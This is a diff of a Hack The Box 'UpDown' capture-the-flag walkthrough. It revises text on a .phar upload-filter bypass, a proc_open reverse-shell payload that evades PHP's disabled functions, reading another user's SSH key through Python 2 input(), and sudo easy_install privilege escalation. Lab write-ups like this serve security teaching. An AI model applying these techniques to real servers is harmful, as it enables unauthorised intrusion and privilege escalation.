@@ -17,9 +17,9 @@ description: HTB - UpDown walkthrough
 
 ## Summary
 
-Updown is a medium box where we find an SSRF vulnerability but there is not much we can do with it. Enumerating the subdomains we can see de dev subdomain but we have no access, even from the SSRF. In the end, we find a .git folder were some files were staged. Recovering them will display the .htaccess, where we have to use an special header to access that server. In the dev subdomain, the website allow the user to upload a file into the server. Since it is PHP, the main target is to bypass the filter and aupload a revshell. First, we need to use the phar extension and the _proc_open_ function in PHP, since the exec and similar functions are not allowed.
+Updown is a medium box where we have a website that checks if another website is up. Enumerating the subdomains we can see the dev subdomain but we have no access. On the main domain, we find a /.git folder where some files were staged. Recovering them will display the .htaccess, disclosing the special header required to access that dev subdomain. In it, the website allows the user to upload a file into the server. Since we have recovered the code from the .git folder, we coudl check the code to discover a gap on the extension check for the file upload. Also we have exec() and similar functions disabled (discovered it checking the phpinfo()). To craft the payload I had to use the _phar_ extension and the _proc_open_ function to finally get a revshell as www-data.
 
-Once we get inside as www-data, we can see a python2.7 script and a binary format for that script. It uses the input() function, so we could abuse it to reach the id_rsa file from the user **developer** and SSH into the machine to get the flag.
+Once inside, we can see a python2.7 script and a binary format for that script. It uses the input() function, so we could abuse it to reach the id_rsa file from the user **developer** and SSH into the machine to get the flag.
 
 For privesc, we can see that the user can sudo with no password with the command easy_install. Crafting a python package with a shell and installing it with sudo will do the job to get the root shell.
 
@@ -474,7 +474,8 @@ Also remember to add http://dev.siteisup.htb/ to the scope on burp. Then we are 
   <img src="/images/walkthroughs/hackthebox/updown/3_3_dev.png" width="70%"/>
 </p>
 
-In this new dev website we can see that they allow the users to upload a file. We will try to exploit this upload functionality. Exploring the site and the code, we can set our redirection script to take 10 seconds sleep before solving the redirection. That time gap will provide us some room to check the uploaded file and potentially, avoid filter detection to upload a webshell. To avoid the detection, there are some tricks from previous CTF that I did. At [Hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology) there is a compilation of potential extensions that get executed. When I saw the code, I inmediately thought about the **.phar** extension:
+
+As seen in the code, the uploaded file goes to the /uploads endpoint. It checks the extension for php so it doesn't get executed but when I saw the code, I inmediately thought about the **.phar** extension that I used in some CTFs to bypass these kind of filters:
 
 
 ```php
@@ -483,7 +484,24 @@ $ext = getExtension($file);
 if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
   die("Extension not allowed!");
 }
+
+# Create directory to upload our file.
+$dir = "uploads/".md5(time())."/";
+if(!is_dir($dir)){
+      mkdir($dir, 0770, true);
+  }
+
+# Upload the file.
+$final_path = $dir.$file;
+move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
+
+# Read the uploaded file.
+$websites = explode("\n",file_get_contents($final_path));
 ```
+
+We will try to exploit this upload functionality by creating a revshell and uploading it to the server. The first line of the _phar_ file will be our server with the script, which will wait 10 seconds until it redirects, this way, we will have time to check the upload file (since it gets deleted periodically). Once opened, we will get the revshell back.
+
+We can list the uploads directory:
 
 <p align="center">
   <img src="/images/walkthroughs/hackthebox/updown/4_1_payload.png" width="70%"/>
@@ -515,13 +533,15 @@ http://10.10.14.41
   <img src="/images/walkthroughs/hackthebox/updown/4_3_phpinfo.png" width="90%"/>
 </p>
 
-On the disable functions, we can see the exec, shell_exec, etc... That it is why our shell is now comming back:
+When this happens on PHP you might look for the disable functions. In this case, we can see that exec, shell_exec, etc, are disabled, that it is why our shell is not comming back:
 
 ```
-pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
+pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,
+pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,
+system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
 ```
 
-We can check the [PHP documentation](https://www.php.net/manual/en/ref.exec.php) to see if any of the functions is not blocked, so we can use it to execute code. We see that _proc_open_ is not blocked. Let's test the following payload:
+We can check the [PHP documentation](https://www.php.net/manual/en/ref.exec.php) to see if there is any useful function to execute code. We see that _proc_open_ is not blocked. Let's test the following payload:
 
 
 ```php
@@ -546,7 +566,6 @@ $descriptorspec = array(
    2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
 );
 
-
 $process = proc_open($shell, $descriptorspec, $pipes);
 
 if (!is_resource($process)) {
@@ -565,7 +584,7 @@ We got the first execution correct. Due to the threading process on the original
 </p>
 
 
-So modifying the input string on the pipe[0] we can create a revshell. Tried hard on the _mkfifo /tmp/f_ revshell but didn't work, seems like the concatenation or the pipe didn't worked out. Used a basic redirection:
+So modifying the input string on the pipe[0] we can create a revshell. Tried hard on the _mkfifo /tmp/f..._ revshell but didn't work, seems like the concatenation or the pipe are messing the call. Used a basic redirection and it worked:
 
 
 ```php
@@ -607,15 +626,14 @@ echo "command returned $return_value\n";
 ?> 
 ```
 
-And we are in as www-data:
+And we are in as www-data (rememeber to set a listener for your revshell ;)):
 
 <p align="center">
   <img src="/images/walkthroughs/hackthebox/updown/4_5_in.png" width="70%"/>
 </p>
 
 
-First thing we can see is this folder:
-
+Listing the current folder we see some interesting files:
 
 ```bash
 www-data@updown:/home/developer/dev$ ls -la
